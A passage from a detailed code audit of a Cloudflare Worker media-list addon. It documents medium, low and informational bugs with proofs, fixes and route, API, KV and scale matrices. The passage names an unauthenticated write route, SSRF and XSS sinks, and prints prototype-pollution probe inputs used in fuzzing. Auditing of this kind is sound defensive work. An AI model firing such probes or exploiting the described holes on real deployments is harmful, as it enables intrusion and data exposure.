that is meant to be filled and never is.

### Proof / Evidence

`p02_clientid.mjs` intercepts outbound fetches through a full start→callback flow:

```
start status 302 state da9EZlazTRvN
callback status 302
Location: https://example.test/#trakt_token=ACCESS123          <- no &trakt_username=
outbound fetches: [ 'https://api.trakt.tv/oauth/token' ]        <- /users/me never happened
```

Semantics confirmed directly: `({k: clientId || 'fallback'})` → `ReferenceError: clientId is not defined`.

### Recommended Fix

`"trakt-api-key": TRAKT_CLIENT_ID` (the value the token exchange 15 lines above already uses).

### Regression Risk

None — the current expression cannot evaluate.

### Related Findings

Same root cause as `isShow`; same one-line CI fix (`no-undef`).

---

## [MEDIUM] `list-copy` telemetry can never fire — the admin "copies" column is structurally zero

**Category:** Dead code / Data Integrity
**Confidence:** Confirmed (executed end-to-end, plus a control)
**File:** `18_client-copy-and-trakt-export.js:232`
**Function:** `copyListToCustomList()`

### Description

```js
for (let i = 0; …; i++) {
  const listName = i === 0 ? baseListName : baseListName + ' ' + (i + 1);   // block-scoped
  …
}
…
if (created.length) {
  try {
    if (typeof trackEvent === 'function') {
      trackEvent('list-copy', listUrl || listName, listName);   // listName is out of scope
    }
  } catch (e) {}
  renderCreatorDashboard();
}
```

`listName` is `const` inside the loop body. The reference at line 232 is outside it, so it is an
unbound identifier — `ReferenceError`, swallowed by the surrounding `catch (e) {}`.

### Why It Matters

This is the **only** site in the entire codebase that emits a `list-copy` event. Therefore
`stats:list_copy:{slug}` has never been written, `readStatTotalsByPrefix(env, "list_copy:")`
always returns an empty map, and the admin Community Lists panel's **copies** column is
permanently 0 — including in its ranking, `sort((a,b) => (b.likes + b.copies*2) - …)`.

The regression angle matters more than the counter: a previous round did real work here
(`recordListCopySlug`, `03_admin.js:1069`) to fix the *server* side — *"the whole
`stats:list_copy:` namespace was write-only"* — and shipped it without ever checking that a
client event reaches it. The server fix is correct and has never run.

### Proof / Evidence

`p04b_listcopy_e2e.mjs` — the real function, driven through the client harness:

```
alerts: ['List Copied: Created "My Test List" (1 item) in your Custom Lists — …']
/api/track-event requests: 0
all requests: []
```

`p04c.mjs` — identical run with a `listName` binding injected, the only difference:

```
/api/track-event requests: 1
[{"events":[{"eventType":"list-copy","id":"https://trakt.tv/users/x/lists/y","title":"injected","mediaType":"movie"}]}]
```

### Recommended Fix

Hoist the value the event wants. `created[0].name` is already in scope and is exactly the name
the first list was saved under:

```js
trackEvent('list-copy', listUrl || created[0].name, created[0].name);
```

### Regression Risk

Once this starts firing, `recordListCopySlug` will begin creating `stats:list_copy:` keys.
That is the intended behaviour and it is already bounded (it only records lists hosted on this
addon, keyed by slug), but it is a KV write path that has been dormant — worth watching the
write count on a free-plan deployment (see the free-plan finding below).

---

## [MEDIUM] Anonymous lists are advertised at `/lists/Anonymous/<slug>`, which 404s

**Category:** API Contract / Reliability
**Confidence:** Confirmed (executed)
**File:** `25_api-catalog-routes.js:452–466`, mirrored at `26_api-creator-and-admin-routes.js:3426`
**Affected routes:** `GET /lists/public.json`, `GET /api/public-lists.json`

### Description

The index-backed path is correct — `const username = e.isCreator ? e.username : "user"` gives
`/lists/user/<slug>`. The **legacy fallback**, used whenever `index:publiclists` is absent, sets
`username = "Anonymous"` and builds `url` and `jsonUrl` from that. The record actually lives at
`publishedlist:user:<slug>`, so the advertised URL resolves to nothing.

### Why It Matters

The fallback is not an edge case: it runs on every fresh deployment, after a KV namespace
rebind, if the index key is lost — and for the whole duration of the first rebuild, which is
deliberately chunked one slice per cron tick and takes hours on a large deployment. During that
window every anonymous list in the public directory carries a dead link. The `updatedAt` is
`null` too, because anonymous publishes store `publishedAt` and the fallback reads
`l.updatedAt || l.createdAt`.

`/api/search-published-lists` gets it right (`username: "user"`), so the two directory
endpoints disagree with each other.

### Proof / Evidence

`p19_anonurl.mjs`:

```
directory (fallback): {"…","creator":"Anonymous","updatedAt":null,
  "url":"https://example.test/lists/Anonymous/anon-test-list", …}
GET /lists/Anonymous/anon-test-list -> 404 {"ok":false,"error":"No list found at that address."}
GET /lists/user/<slug>              -> 200
search: {"…","username":"user","url":"https://example.test/lists/user/anon-test-list"}
```

### Recommended Fix

In the fallback, keep `creator: "Anonymous"` for display but build the URL from the key
namespace, matching the index path:

```js
const urlUser = isCreator ? username : "user";
url:     `${url.origin}/lists/${urlUser}/${cleanSlug}`,
jsonUrl: `${url.origin}/lists/${urlUser}/${cleanSlug}.json`,
```

### Regression Risk

None; it only ever produced a 404. Keep `creator` as-is — the client displays it.

---

## [MEDIUM] The documented deployment target (a free Cloudflare Worker) cannot run several core paths

**Category:** Scalability / Configuration
**Confidence:** Confirmed for the measurements; **Likely** for the exact free-plan outcome
(no Cloudflare account available to observe enforcement)
**File:** `README.md:17`, `00_constants.js:64, 75, 192`, `03_admin.js:bumpStat`
**Affected:** `/api/bulk-resolve`, `/api/details/batch`, `scheduled()`, every authenticated route

### Description

README.md:17 — *"self-host on your own free Cloudflare Worker."* The JSON-LD description in
`09_page-shell.js:61` says the same. `00_constants.js:75` sizes budgets against *"Cloudflare's
1,000-subrequest-per-invocation limit."*

Cloudflare's current limits (fetched 2026-09-08):

* Workers **Free**: CPU **10 ms**, subrequests **50/invocation**, 100k requests/day.
* Workers **Paid**: CPU 5 min, subrequests **10,000/invocation** (configurable).
* KV, **both plans**: **1,000 operations per invocation**; *"writes to the same key — 1 per second"*.
* KV **Free**: **1,000 writes to different keys per day**, 100k reads/day, 1 GB/namespace.
* *"A subrequest is any request a Worker makes using the Fetch API or to Cloudflare services like R2, KV, or D1."*

So "1,000" is the KV/internal-op number, not the outbound-fetch number, and the outbound number
on the free plan is 50.

### Why It Matters — measured

Outbound `fetch()` per invocation (`p23_subrequests.mjs`, provider responses stubbed):

```
POST /api/bulk-resolve (200 titles, its own documented max)  fetch()= 400   <== over 50
POST /api/bulk-resolve (20 titles)                           fetch()=  40
POST /api/details/batch (60-id cap)                          fetch()= 180   <== over 50
cron scheduled() tick, 30 accounts                           fetch()= 186   <== over 50
GET  /api/title-search?q=matrix                              fetch()=   5
```

`00_constants.js:64` says of bulk-resolve: *"200 items is ~400 subrequests, comfortably [under]
Cloudflare's 1,000-subrequest-per-invocation limit."* The measurement matches the comment
exactly; the comment's conclusion is right for paid and wrong for free. Consequences on free:
the Letterboxd CSV import dies above ~25 titles, and the cron dies **every tick**, so Continue
Watching and chart pre-warming never run.

CPU (`p24_cpu.mjs`, this container):

```
PBKDF2(100k, SHA-256)                      17.57 ms per verification
POST sync/save (WRONG key -> full PBKDF2)  20.0  ms/req
GET /app.js                                10.8  ms/req
module evaluation (cold isolate)           24.7  ms
```

Against a 10 ms cap, a cold isolate cannot finish its first request, and **no un-memoized
creator-key verification can complete** — that is every sign-in and every request landing on a
cold isolate. The absolute numbers are this machine's; the ratio is not machine-dependent, and
the code's own comment already estimates PBKDF2 at *"~15ms of CPU"*.

KV writes with D1 unbound (`p22_kvops.mjs`):

```
GET /  (page view, no D1)      get=2 put=2   writes:[stats:pageviews:total, stats:pageviews:<day>]
GET /  (page view, with D1)    get=0 put=0
POST /api/creator/lists/save   get=10 put=5
POST /api/track-event          get=4 put=5
```

**~500 page views exhausts the free plan's entire 1,000-writes-per-day budget**, after which
every KV write in the app fails — rate limiters, sync saves, list saves, feedback. And
`stats:pageviews:total` is one key written on every page view, against a 1-write-per-second
per-key limit on both plans.

### Recommended Fix

Not a code rewrite — a documentation and default correction:

1. Say in README.md which limits the app is sized for. If free is the target, say that D1 is
   effectively required (it moves counters off KV entirely — measured: 2 KV writes → 0) and
   that bulk import and the cron need a paid plan.
2. Correct the comments at `00_constants.js:64, 75, 192` to name both caps and both plans.
3. Chunk `/api/bulk-resolve` the way `/admin/api/migrate-d1` is already chunked, so it works
   under a 50-subrequest budget rather than assuming 1,000.
4. Consider `limits.cpu_ms` in `wrangler.toml` for paid deployments, and note that PBKDF2 at
   100k iterations is the single largest CPU item.

### Regression Risk

Chunking bulk-resolve changes a client contract (`18_client-copy-and-trakt-export.js`
Letterboxd import) — it must keep working when the endpoint returns partial results plus a
continuation, or an import silently drops titles, which is worse than failing.

---

## [MEDIUM] `index:publiclists` is a single global hot key: 4.45 MB read-modify-write per save, against a 1-write/second limit

**Category:** Scalability / Race Condition
**Confidence:** Confirmed (measured)
**File:** `02_http-and-creator-utils.js:2171–2215`
**Function:** `writePublicListIndex()` / `updatePublicListIndex()`

### Description

Every public list save (`26_…:2083`), every anonymous publish (`25_…:5782`) and **every
like/unlike** (`25_…:5897`) does a read-modify-write of one KV key holding the whole directory,
capped at `PUBLIC_INDEX_MAX = 20000` entries.

Cloudflare KV: *"Writes to same key — 1 per second"*, both plans.

### Why It Matters — measured

`p21_scale_index.mjs`, one `/api/creator/lists/save` at each index size:

| index entries | blob | index reads | index writes | wall |
|---:|---:|---:|---:|---:|
| 100 | 0.02 MB | 1 | 1 | 22.6 ms |
| 1,000 | 0.21 MB | 1 | 1 | 21.6 ms |
| 5,000 | 1.09 MB | 1 | 1 | 29.2 ms |
| 20,000 | **4.45 MB** | 1 | 1 | **59.3 ms** |

Two problems compound:

* **Throughput.** Likes are the frequent write. Past roughly one like per second across the
  whole deployment, index writes are being issued faster than KV accepts them. The code is
  honest that this loses updates — *"concurrent publishes can lose an update. That is
  acceptable here… the index is a rebuildable cache"* — and the daily
  `refreshPublicListIndexIfStale` is a real backstop. But the failure mode at scale is
  "the directory is hours stale for everyone", not "one entry is late".
* **Cost per write.** At the 20,000 cap each save parses, sorts and re-serialises 4.45 MB —
  ~37 ms of added wall time here, and 8.9 MB of KV traffic for a one-list change.

Beyond 20,000 public lists the index silently truncates. It truncates by likes (the least
popular drop), which is the right choice, but nothing surfaces that it happened.

### Recommended Fix

Not urgent below a few thousand lists; the shape to move toward when it is:

* Shard the index by first slug character (32 keys) so writes spread and each blob is ~1/32
  the size — the read path merges 32 gets, still one round trip.
* Stop writing the index on like/unlike. Likes already live on the record and in D1; the
  directory can sort on a periodically-refreshed snapshot instead of on every vote.
* Surface `entries.length >= PUBLIC_INDEX_MAX` in `/admin/api/schema-status` so truncation is
  visible before it matters.

### Regression Risk

Sharding changes `readPublicListIndex`/`writePublicListIndex`/`rebuildPublicListIndex` and the
chunked build state together. Done piecemeal it produces a half-sharded index that serves a
fraction of the directory, which is worse than the current behaviour. Do it in one change with
a version marker in the build state.

---

## [MEDIUM] A failed list edit reports success: `saveLocalCustomListEdit()` shows "saved" on 401, 409 and 500

**Category:** Frontend / Error handling
**Confidence:** Confirmed (executed)
**File:** `21_client-custom-list-builder.js:629–695`
**Function:** `saveLocalCustomListEdit()`

### Description

```js
try {
  const res = await fetch(ORIGIN + '/api/creator/lists/save', { … });
  const data = await res.json();
  if (data.ok && data.url) { finalUrl = data.url; }
} catch (e) {}

if (typeof showSavedCustomListModal === 'function') {
  showSavedCustomListModal(name, visibility, finalUrl);   // unconditional
}
```

There is no `else` and no error path. The account mirror's outcome is discarded entirely.

### Why It Matters

The local copy is saved, so the edit looks correct in this browser — but nothing reached the
account. On the next sign-in or on another device, the server's older copy wins and the edit is
gone, with the user having been shown a success modal.

Its sibling `saveCreatorListEdit()` (line ~560–623), fifty lines above, has a proper
`catch` that shows *"A network error occurred while saving."* The two disagree.

### Proof / Evidence

`p33_falsesuccess.mjs`, driving the real function against three server answers:

```
server 500 ok:false   -> requests=1  UI: ["modal \"my-list\" saved -> …"]
server 409 conflict   -> requests=1  UI: ["modal \"my-list\" saved -> …"]
server 401 bad key    -> requests=1  UI: ["modal \"my-list\" saved -> …"]
```

### Recommended Fix

Mirror the sibling: on `!res.ok || !data.ok`, show the failure and say the change is saved
locally but not to the account. A 409 in particular should offer to reload the server copy —
the server sends `conflict: true` and the current `updatedAt` precisely so the client can.

### Regression Risk

Low. Do not make the *local* save conditional on the server — the function's job is the local
list and that part works; only the reported outcome is wrong.

---

## [MEDIUM] The optimistic-concurrency guard is armed on 2 of 12 `lists/save` client call sites

**Category:** API Contract / Data Integrity
**Confidence:** Confirmed (source-mapped)
**File:** 12 call sites across `18_`, `19_`, `21_`, `22_`
**Affected route:** `POST /api/creator/lists/save`

### Description

The server grew `expectedUpdatedAt` (409 + `conflict: true` on a stale write) and it is
deliberately additive — a client that omits the field keeps last-write-wins. Mapping every
client call site:

| call site | function | guard |
|---|---|---|
| `18_…:79` | `saveItemsAsNewCustomList()` | no |
| `19_…:3109` | `syncCustomListPayload()` | **no — sends an explicit `slug`** |
| `21_…:416` | `saveCustomList()` | no |
| `21_…:560` | `saveCreatorListEdit()` | **armed** |
| `21_…:663` | `saveLocalCustomListEdit()` | **no — sends an explicit `slug`** |
| `21_…:1320` | `removeWatchedItemFromWatchlist()` | **no — sends an explicit `slug`** |
| `22_…:311` | `migrateLocalCustomListsToAccount()` | no |
| `22_…:3164` | `confirmSaveAsCreator()` | no |
| `22_…:3506` | `uploadMissingLocalListsToAccount()` | no |
| `22_…:3633` | `renderCreatorDashboard()` | no |
| `22_…:4904` | `submitCreateListModal()` | no |
| `22_…:5206` | `saveCreatorListWithBaseline()` | **armed** |

### Why It Matters

The unguarded sites that pass a `slug` are **whole-list replacements of an existing list** —
exactly the case the guard exists for. `removeWatchedItemFromWatchlist()` rewrites the entire
Watchlist from a possibly-stale local copy and is fire-and-forget (`.catch(() => {})`), so a
second device's Watchlist additions can be erased with nothing reported anywhere.

The remaining eight are creates, where there is no prior version to clobber — genuinely fine to
leave unguarded.

### Recommended Fix

Route the three slug-bearing sites through the existing `saveCreatorListWithBaseline()`
(`22_…:5206`), which already reads the baseline and sends the field. That is one helper, not
three new bits of logic.

### Regression Risk

Those sites now have to handle 409. Without that they will start failing where they used to
silently overwrite — better, but only if the failure is surfaced (see the previous finding).
Fix the two together.

---

## [MEDIUM] `/api/publish-list`: an unauthenticated permanent-write endpoint with no caller in the app

**Category:** Dead route / Resource abuse
**Confidence:** Confirmed (executed; absence of a caller confirmed against the rendered page)
**File:** `25_api-catalog-routes.js:5714`
**Affected route:** `POST /api/publish-list`

### Description

The endpoint accepts an anonymous body and writes a permanent KV key with **no TTL**
(deliberate — the slug is somebody's shared link). Bounds: `PUBLISHED_LIST_ITEMS_MAX = 10000`,
`PUBLISHED_LIST_BYTES_MAX = 2 MB`, 10 publishes/minute/IP.

The string `publish-list` **does not appear anywhere in the rendered client bundle**. Nothing
in the shipped UI calls it.

### Why It Matters

10 × 2 MB per minute per IP = 20 MB/minute of permanent, unowned storage from an endpoint no
legitimate user reaches — 1 GB (the free plan's whole namespace) in under an hour from a single
address, and the free plan's 1,000-writes-per-day budget in under two minutes. Removal is
admin-only and manual.

It is also **vector A of the critical XSS above** — the easiest path to a stored payload,
precisely because it needs no account.

### Proof / Evidence

`p35_misc.mjs`: `publish-list accepted from one IP in a burst: 10 of 12` (the rate limit works,
at 10/minute). `grep 'publish-list' rendered.html` → no match.

### Recommended Fix

Decide whether the feature is live. If it is not (the evidence says so), remove the route —
existing `publishedlist:user:*` records stay readable through `/lists/user/<slug>`, which is a
separate code path. If it is meant to stay, tighten the ceilings (2 MB per anonymous list is
far above the ~1,200-item real-world maximum the code's own comment cites) and require the same
per-item shape validation the authenticated sibling applies.

### Regression Risk

Removing the route breaks any out-of-band integration that posts to it. Grep deployment
history first; the repo has none.

---

# LOW Findings

## [LOW] `/api/external-list/create` returns HTTP 500 and an internal error string for a non-string field

**Category:** Error handling
**Confidence:** Confirmed (executed)
**File:** `25_api-catalog-routes.js:3909–3913`

```js
const provider = (body.provider || "").toLowerCase().trim();
const name     = (body.name || "").trim();
```

A JSON body where `name` is an object/array/number reaches `.trim` on a non-string.
`p07_fuzz.mjs` — the only uncaught 5xx in ~1,700 fuzzed requests:

```
/api/external-list/create | wrong-types | 500 | {"ok":false,"error":"(body.name || \"\").trim is not a function"}
```

**Fix:** `String(body.x || "")`, matching `26_…:1790` which already does exactly that.
**Risk:** none.

## [LOW] `/api/creator/reset-key` answers HTTP 200 on every failure

**Category:** API Contract
**Confidence:** Confirmed (executed — `p05_authmatrix.mjs`, the one row that is not 401)
**File:** `26_api-creator-and-admin-routes.js:1340–1428`

Rate-limited, unknown-username, no-recovery-answer and wrong-answer all return
`json({ ok: false, error: … })` at 200. Round 1 fixed *"14 endpoints returned HTTP 200 on auth
failure"* for exactly this reason; this one kept it. Clients that branch on status treat a
refused reset as success. **Fix:** 429 for the two throttles, 401 for the generic failure,
keeping the message identical so it stays non-enumerable.

## [LOW] Dead code

| Item | Evidence | Safe to remove? |
|---|---|---|
| `runListSearch()` (`19_…:446`) | the only function in the 567-function client bundle with no identifier reference **and** no inline-handler reference (`deadfn.mjs` + `handlers.py`) | yes |
| `/api/external-list/item-add`, `/api/external-list/item-remove` (`25_…:3148`) | aliases of `item-mutate`; no client reference | yes, but they are cheap aliases — leaving them costs nothing |
| `POST /api/creator/sync/share-tracking` (`26_…:3298`) | no client reference; the only writer of `creatorshare:`, so the opt-in "share my watch history" feature has **no UI** | keep the route, add the UI or document it as API-only |
| `/api/publish-list` | see MEDIUM above | decide |

## [LOW] The admin session cannot be revoked; `/admin/logout` accepts any method

**Category:** Authentication
**Confidence:** Confirmed (executed — `p35_misc.mjs`)

The cookie is `expiresAt.HMAC(ADMIN_KEY, expiresAt)` with no server-side state, so
`/admin/logout` only clears the browser's copy:

```
/admin/logout GET/POST/HEAD/PUT/DELETE  -> 302, all clear the cookie
cookie still valid after logout (stateless session): true
```

A captured cookie value keeps working for up to 7 days and the only revocation is rotating
`ADMIN_KEY` (which also invalidates the operator's own sessions). The any-method logout is not
meaningfully CSRF-able — the clearing `Set-Cookie` carries `SameSite=Strict`, which browsers
refuse to apply from a cross-site subresource — so this is a documentation and design note
rather than a bug. **Fix, if wanted:** put a generation counter in KV and include it in the
signed payload, so bumping it revokes every issued cookie.

---

# Informational Findings

* **The install link is a bearer credential, and nothing says so.** `buildConfig()`
  (`23_…:339`) puts `tmdbKey`, `mdblistKey`, `mdblistAccessToken`, `traktKey`,
  `traktAccessToken`, `simklKey`, `simklAccessToken` and — when Auto-track is on —
  `trackCreatorName` + **`trackCreatorKey`** into the config. With KV bound that lives behind a
  12-character id (72 bits, not enumerable); without KV it is base64 **in the URL itself**.
  Users are told to copy that link around. `/api/resolve` then hands most of it back to anyone
  who has the id (see the HIGH finding). Worth a line in the README at minimum.
* **`url.hostname.includes("mylistsaddon.com")`** (`25_…:2723`, `:2869`) picks the OAuth
  `redirect_uri` by substring. Not exploitable — Cloudflare only routes configured hostnames to
  the Worker — but `=== "mylistsaddon.com" || endsWith(".mylistsaddon.com")` costs nothing.
* **The `escapeAttr` comment at `19_…:154`** is one of the best pieces of writing in this
  repo and describes precisely the trap the server-rendered preamble fell into. The knowledge
  was present; only the application was missing.
* **Prior-audit claims falsified by this round:** *"No XSS"* (AUDIT-2026-09-05:271) and
  *"Hostile payloads through published-list names/descriptions/creator names … all inert"*
  (AUDIT-2026-09-07-FRONTEND:1245). Both were true of the paths they tested; neither tested
  `renderBuilder`'s inline preamble.
* **KV `.list()` inventory — clean.** 21 syntactic sites; 2 are counting-wrapper definitions;
  13 of the remaining 19 paginate with a cursor; 6 are deliberate single-page reads, each
  documented (`03_…:936` COMMUNITY_CAP fallback; `25_…:431/432` and `26_…:3426/3427` the
  legacy 150-key fallback used only while the index is cold; `26_…:3956` backfill-trending's
  20-per-account slice). **No silent-truncation bug remains** — that class is closed.
* **Prototype pollution — none.** `{"__proto__":…}`, `{"constructor":{"prototype":…}}` posted
  to all 112 routes left `Object.prototype` untouched (`p07_fuzz.mjs`).
* **The service worker is correctly scoped.** Network-first for navigations, cache-first only
  for content-addressed `/app.js?v=` and `/app.css?v=`, old cache names dropped on activate.
  Users cannot get stuck on stale JS after a deploy.

---

# Route Security Matrix

115 distinct route patterns. Summarised by class rather than one row each; every creator and
admin route was individually exercised (`p05`, `p06`) and every literal route fuzzed (`p07`).

| Route class | Count | Auth | Authorization correct | Input validated | Rate limited | CSRF safe | Error safe | Result |
|---|---:|---|---|---|---|---|---|---|
| `POST /api/creator/*` (19) | 19 | key | ✅ all `auth.username`, never `body.creatorName` | ✅ | ✅ shared `creatorauth` bucket | ✅ no cookie auth | ✅ | **pass** |
| `POST/GET /admin/api/*` (21) | 21 | signed cookie | ✅ 401 with none / forged / expired | ✅ | login: IP + daily budget | ✅ SameSite=Strict | ✅ | **pass** |
| `GET /admin`, `/admin/login`, `/admin/logout` | 3 | — | ✅ | ✅ | ✅ | ✅ | ✅ | logout not revocable — **LOW** |
| `POST /api/creator/reset-key` | 1 | recovery answer | ✅ | ✅ | ✅ IP + per-account | ✅ | ⚠️ 200 on failure | **LOW** |
| Public catalog / manifest / meta / subtitles | ~12 | none by design | n/a | ✅ | n/a | CORS `*` read-only | ✅ | pass |
| `GET /lists/:user/:slug` | 1 | none | ✅ visibility fail-closed | ✅ | — | — | ✅ | **XSS sink — CRITICAL**; ghost lists — **HIGH** |
| `GET /:config/configure`, `/:config/manifest.json` | 2 | none | n/a | ⚠️ | — | — | ✅ | **XSS sink — CRITICAL** |
| `GET /lists/curated/:slug` | 1 | none | n/a | n/a | — | — | ❌ | **always 500 — HIGH** |
| `GET /api/resolve` | 1 | none | ❌ returns another account's tokens | ⚠️ `url` unvalidated | ❌ none | — | ✅ | **SSRF + token cache — HIGH ×2** |
| `POST /api/publish-list`, `/api/save` | 2 | none | n/a | ✅ bounded | ✅ 10/min IP | ✅ | ✅ | dead route — **MEDIUM** |
| `POST /api/preview` | 1 | none | n/a | ✅ host allowlist | ✅ 80/min | ✅ | ✅ | pass (hardened round 5) |
| `POST /api/external-list/*` | 5 | provider token | provider-enforced | ⚠️ no `String()` | — | ✅ | ❌ 500 | **LOW** |
| `POST /api/bulk-resolve`, `/api/details/batch`, `/api/recommendations` | 3 | none | n/a | ✅ capped | ✅ | ✅ | ✅ | free-plan subrequests — **MEDIUM** |
| `POST /api/track-*`, `/api/feedback*` | 5 | none / key | ✅ | ✅ | ✅ | ✅ | ✅ | pass |
| `/api/scrobble*` | 1 | token or key | ✅ | ✅ | ✅ via `creatorauth` | n/a webhook | ✅ | pass |
| Static (`/icon.png`, `/sw.js`, `/app.js`, `/app.css`, `/robots.txt`, `/sitemap.xml`, `/guide`, `/app.webmanifest`) | 8 | none | n/a | n/a | n/a | n/a | ✅ | pass |
| OAuth start/callback × 4 providers | 8 | state cookie | ✅ HttpOnly, Secure, SameSite=Lax, 600 s, `timingSafeEqualHex` | ✅ | — | ✅ state | ✅ | Trakt `/users/me` broken — **MEDIUM** |

---

# API Contract Matrix

Every client `fetch()` target was extracted and matched against the route table. **All 59
distinct client paths resolve to a real route** — no wrong URLs, no wrong methods, no
misspelled paths. Mismatches found are of shape, not address:

| Frontend call | Method | URL | Frontend sends | Backend expects | Response | Match |
|---|---|---|---|---|---|---|
| `saveCreatorListEdit`, `saveCreatorListWithBaseline` | POST | `/api/creator/lists/save` | `+ expectedUpdatedAt` | optional guard | 200 / **409** | ✅ |
| `saveLocalCustomListEdit`, `syncCustomListPayload`, `removeWatchedItemFromWatchlist` | POST | `/api/creator/lists/save` | `slug`, **no** `expectedUpdatedAt` | optional guard | 200 (last-write-wins) | ⚠️ **MEDIUM** |
| `saveLocalCustomListEdit` | POST | `/api/creator/lists/save` | — | — | ignores 401/409/500 | ❌ **MEDIUM** |
| `copyListToCustomList` | POST | `/api/track-event` | never sent — `ReferenceError` | `{events:[{eventType:'list-copy',…}]}` | — | ❌ **MEDIUM** |
| `pickUpTraktTokenFromUrl` | — | `#trakt_token=…&trakt_username=…` | reads both | server never sends `trakt_username` | — | ❌ **MEDIUM** |
| `getListCleanPath` → `pushState` | GET | `/lists/curated/<slug>` | — | route 500s | HTTP 500 | ❌ **HIGH** |
| directory consumer | GET | `/lists/public.json` | reads `.url` | fallback emits `/lists/Anonymous/…` | 404 on click | ❌ **MEDIUM** |
| `resolveInstallLinkData` | GET | `/api/resolve?config=&url=` | remote origin | **no allowlist** | mirrors remote | ❌ **HIGH** |
| everything else (52 paths) | — | — | — | — | — | ✅ |

Backend supported but never called by the frontend: `/api/publish-list`,
`/api/creator/sync/share-tracking`, `/api/external-list/item-add`, `/api/external-list/item-remove`,
`/api/public-lists.json` (alias).

---

# KV Audit Matrix

| Location | Op | Prefix / key | Pagination | Max dataset | Race risk | Failure risk |
|---|---|---|---|---|---|---|
| `02_…:2456` `advancePublicListIndexBuild` | list | `creatorlist:` / `publishedlist:user:` | ✅ cursor, 400/page, op budget | all lists | low (chunk state persisted) | restarts cleanly |
| `02_…:2647` `listAllKeys` | list | caller's | ✅ cursor, 1000/page, `maxKeys` | caller's | none | none |
| `02_…:2909` `purgeCreatorData` | list | `creatorlist:{u}:` | ✅ cursor, 50 pages | one account | **in-flight write survives — HIGH** | `dataSweepFailed` → 500 |
| `02_…:3112` `purgeCreatorData` (2nd sweep) | list | `creatorlist:{u}:` | ✅ cursor | one account | same | same |
| `02_…:2171` `writePublicListIndex` | **put** | `index:publiclists` | n/a | 20,000 entries / 4.45 MB | **1 write/s/key — MEDIUM** | documented lossy |
| `03_…:936` leaderboard fallback | list | `creatorlist:` | ❌ single page, `COMMUNITY_CAP` 100 | all lists | none | documented fallback |
| `07_…:1752` `checkForNewEpisodes` | list | `creator:` | ✅ cursor + page offset | all accounts | none | cursor reset on throw |
| `25_…:431/432` directory fallback | list | `publishedlist:user:` / `creatorlist:` | ❌ single page, 150 | all lists | none | documented; **Anonymous-URL bug — MEDIUM** |
| `25_…:5078` feedback threads | list | `feedback:` | ✅ cursor, 1000/page | all threads | none | none |
| `26_…:1634` list-order repair | list | `creatorlist:{user}:` | ✅ cursor, 5 pages | one account | none | best-effort |
| `26_…:3426/3427` search fallback | list | `publishedlist:user:` / `creatorlist:` | ❌ single page, 150 | all lists | none | documented fallback |
| `26_…:3904` backfill-trending | list | `creator:` | ✅ cursor, `limit: 1` | all accounts | none | cursor reset at end |
| `26_…:3956` backfill-trending lists | list | `creatorlist:{username}:` | ❌ `limit: 20` | one account | none | intentional slice |
| `26_…:4224` migrate-d1 | list | phase prefix | ✅ cursor + op budget 700 | all keys | none | resumable state |
| `26_…:4342` admin creator-lists | list | `creatorlist:` | ✅ cursor + limit | all lists | none | none |
| `26_…:4522` admin published-lists | list | `publishedlist:user:` | ✅ cursor + limit | all lists | none | none |
| `26_…:4626` migrate-day-counts | list | stats | ✅ cursor + batch | all stat keys | none | none |
| `26_…:4708` admin feedback | list | `feedback:` | ✅ cursor, newest 300 | all threads | none | none |
| `bumpStat` (KV path) | get+put | `stats:{kind}:total`, `:{day}` | n/a | 2 keys | **global hot key, 1 write/s** | documented lossy |
| `/api/creator/lists` | **get × N** | `creatorlist:{u}:{slug}` | ❌ **no cap** | one account | none | **>1,000 ops at 990 lists — HIGH** |

---

# Scale Breakpoint Analysis

| Feature | Complexity | 100 users | 1,000 | 10,000 | 100,000 | Failure mode |
|---|---|---|---|---|---|---|
| `/api/creator/lists` (per account) | O(lists) KV gets, unbounded body | fine | fine | fine | fine | **breaks at 990 lists *per creator*, any user count**: 1,001 KV ops > cap; 15 MB body at 1,200 |
| Public directory read | O(1) KV get | fine | fine | fine | 20,000-entry cap | least-liked lists silently drop out |
| Public index write | O(index) RMW on one key | fine | ~4 MB/write, 1 write/s | throttled | throttled | directory hours stale; lost updates until daily rebuild |
| `bumpStat` (no D1) | 2 KV writes/pageview | free-plan quota gone at ~500 views/day | same-key throttle | throttle | throttle | counters under-report; **all KV writes fail** on free |
| `bumpStat` (D1 bound) | atomic upsert | fine | fine | fine | fine | — |
| Cron `checkForNewEpisodes` | 25 accounts + 150 TMDB calls/tick | fine (paid) | fine | ~40 min/full cycle | ~7 h/full cycle | Continue Watching lags; **fails every tick on free** (186 > 50) |
| `prewarmSharedCatalogs` | fixed set | fine | fine | fine | fine | — |
| `/api/bulk-resolve` | 2 fetches/title, cap 200 | fine (paid) | fine | fine | fine | **400 > 50 on free**; import dies above ~25 titles |
| `/api/details/batch` | 3 fetches/id, cap 60 | fine (paid) | fine | fine | fine | **180 > 50 on free** |
| `/admin` dashboard | index get + bounded D1 | fine | fine | fine | fine | already hardened round 5 |
| Index rebuild | 300 ops/tick (cron), 800 (admin) | 1 tick | few ticks | ~1 h | ~10 h | converges; directory is cold-fallback meanwhile (**Anonymous-URL bug visible**) |
| `migrate-d1` | 700 ops/call, client loops | seconds | minutes | ~1 h | ~10 h | resumable |
| Creator-key verification | PBKDF2 100k ≈ 18 ms CPU | fine (paid) | fine | fine | fine | **exceeds 10 ms on free**, every cold verification |
| Worker cold start | 24.7 ms eval of 2.98 MB | fine (paid) | fine | fine | fine | under the 1 s startup limit; **over 10 ms free CPU** |

---

# Function Risk Map

| File | Function | Why high risk | Inputs | State | Boundary | External | Concurrency | Scale |
|---|---|---|---|---|---|---|---|---|
| `09_page-shell.js` | `renderBuilder()` | **the critical XSS sink**; 6 `JSON.stringify`-into-`<script>` and 5 raw attribute interpolations | list names, item titles, display names, config keys/tokens | none | **public HTML** | — | none | 1.79 MB output, memoized |
| `02_…` | `purgeCreatorData()` | irreversible; **in-flight writes survive it** | username | KV + D1, whole account | owner-only | — | **race → ghost public lists** | 50 pages |
| `25_…:5583` | `/api/resolve` handler | **SSRF + cacheable credential disclosure** | `config`, `url` | KV read | **none** | **arbitrary host** | none | unbounded |
| `26_…:1564` | `/api/creator/lists` handler | **hard Cloudflare cap at 990 lists** | key | KV per list | owner | — | none | **O(lists), 15 MB** |
| `02_…:2196` | `updatePublicListIndex()` | global single-key RMW on every save/like | entry | one KV key | — | — | **documented lossy** | 4.45 MB at cap |
| `26_…:2421` | `/api/creator/sync/save-tracking` | merges server + client history; `intentionalRemoval` decides whether deletes stick | full tracking blob | KV blob | owner | — | conflict-guarded | unbounded blob |
